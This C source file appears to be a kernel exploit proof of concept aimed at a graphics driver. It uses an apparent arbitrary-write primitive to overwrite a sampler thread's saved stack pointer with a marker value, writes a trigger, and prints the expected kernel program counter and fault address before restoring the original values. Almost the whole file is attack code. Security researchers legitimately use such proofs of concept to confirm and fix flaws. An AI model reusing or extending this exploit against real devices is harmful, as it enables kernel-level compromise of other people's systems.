#include "poc.h"
#include "gfx.h"
#include "offsets.h"

#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

int poc_run(void)
{
    bool scratch_written = gfx_write64(GFX_SCRATCH,
                                       UINT64_C(0x4141414141414141)) == 0;
    bool scratch_restored = gfx_write64(GFX_SCRATCH, 0) == 0;
    printf("control  target=0x%016llx marker=0x4141414141414141 "
           "written=%u restored=%u\n",
           GFX_SCRATCH, scratch_written, scratch_restored);
    if (!scratch_restored) return 1;

    bool sp_written = gfx_write64(GFX_SAMPLER_SP,
                                  UINT64_C(0x4141414141414141)) == 0;
    printf("arming   sp=0x%016llx value=0x4141414141414141 "
           "written=%u trigger=0x%016llx\n",
           GFX_SAMPLER_SP, sp_written, GFX_SAMPLER_X20);
    bool triggered = sp_written && gfx_write32(GFX_SAMPLER_X20, 0) == 0;
    printf("trigger  written=%u expected_pc=0xfffffc00000331ac "
           "expected_far=0x4141414141414191 kcall=0 physrw=0\n",
           triggered);
    if (triggered) sleep(10);

    (void)gfx_write64(GFX_SAMPLER_SP, GFX_SAMPLER_SP_ORIGINAL);
    (void)gfx_write32(GFX_SAMPLER_X20, 1);
    return 1;
}
